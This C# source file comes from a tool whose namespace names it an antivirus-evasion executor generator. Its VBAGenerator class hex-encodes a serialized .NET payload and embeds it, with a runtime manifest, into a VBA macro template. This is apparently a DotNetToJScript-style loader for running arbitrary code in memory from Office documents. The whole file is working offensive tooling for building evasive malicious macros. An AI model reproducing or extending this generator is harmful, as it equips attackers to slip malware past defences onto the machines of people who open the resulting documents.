using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class VBAGenerator : IScriptGenerator
    {
        public string ScriptName
        {
            get
            {
                return "VBA";
            }
        }

        public bool SupportsScriptlet
        {
            get
            {
                return false;
            }
        }

        public static string GetScriptHeader(Boolean debug)
        {
            StringBuilder builder = new StringBuilder();

            builder.AppendLine("Sub DebugPrint(s)");
            if (debug) builder.AppendLine("    Debug.Print s");
            builder.AppendLine("End Sub");
            builder.AppendLine();

            return builder.ToString();
        }

        public static string GetManifest(RuntimeVersion version)
        {
            StringBuilder builder = new StringBuilder();

            string runtimeVersion = (version != RuntimeVersion.v2) ? "v4.0.30319" : "v2.0.50727";
            string mscorlibVersion = (version != RuntimeVersion.v2) ? "4.0.0.0" : "2.0.0.0";

            string template = Global_Var.manifest_template.Replace(
                                                                    "%RUNTIMEVERSION%",
                                                                    runtimeVersion
                                                                ).Replace(
                                                                    "%MSCORLIBVERSION%",
                                                                    mscorlibVersion
                                                                );

            for (int i = 0; i < template.Length; i++)
            {
                if (i == 0)
                {
                    builder.Append("manifest = \"");
                }
                else if (i % 300 == 0)
                {
                    builder.Append("\"");
                    builder.AppendLine();
                    builder.Append("        manifest = manifest & \"");
                }
                builder.Append(template[i]);
                if (template[i] == '"') builder.Append('"');
            }
            builder.Append("\"");

            return builder.ToString();
        }

        public string GenerateScript(byte[] serialized_object, string entry_class_name, string additional_script, RuntimeVersion version, bool enable_debug)
        {
            string hex_encoded = BitConverter.ToString(serialized_object).Replace("-", "");
            StringBuilder builder = new StringBuilder();

            for (int i = 0; i < hex_encoded.Length; i++)
            {
                if (i == 0)
                {
                    builder.Append("s = \"");
                }
                else if (i % 300 == 0)
                {
                    builder.Append("\"");
                    builder.AppendLine();
                    builder.Append("    s = s & \"");
                }
                builder.Append(hex_encoded[i]);
            }
            builder.Append("\"");

            return GetScriptHeader(enable_debug) +
                Global_Var.vba_template.Replace(
                                                "%SERIALIZED%",
                                                builder.ToString()
                                            ).Replace(
                                                "%CLASS%",
                                                entry_class_name
                                            ).Replace(
                                                "%MANIFEST%",
                                                GetManifest(version)
                                            ).Replace(
                                                "%ADDEDSCRIPT%",
                                                additional_script
                                            );
        }
    }
}
